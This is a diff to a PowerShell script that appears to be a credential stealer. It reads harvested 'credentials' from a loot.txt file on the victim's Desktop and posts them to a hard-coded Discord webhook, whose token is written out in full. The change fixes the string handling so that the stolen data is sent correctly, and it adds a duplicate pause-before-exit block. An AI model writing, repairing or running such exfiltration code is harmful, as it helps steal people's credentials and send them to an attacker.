@@ -114,9 +114,9 @@ try {
     # Send the credentials to Discord webhook
     $webhookUrl = 'https://discord.com/api/webhooks/1153646407476051978/SrG-zO85AIbihBzLpQhCkoz9rSQPSwWJnc-FHNqqYK2wC0hcEfs8txmwWMTlkROZBwGK'
     $data = Get-Content -Path "$env:USERPROFILE\Desktop\loot.txt"
-
+    $dataString = $data -join "`n"
     $bodyContent = @{
-        'content' = $data.Substring(0, [Math]::Min(1999, $data.Length))
+        'content' = $dataString.Substring(0, [Math]::Min(1999, $dataString.Length))
     } | ConvertTo-Json
 
     Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $bodyContent -ContentType 'application/json'
@@ -128,6 +128,10 @@ catch {
     $_ | Out-File "$env:USERPROFILE\Desktop\error_log.txt"
     Write-Host "An error occurred. Check error_log.txt for details."
 }
+
+# Pause before exit
+Read-Host "Press Enter to exit..."
+
 
 # Pause before exit
 Read-Host "Press Enter to exit..."
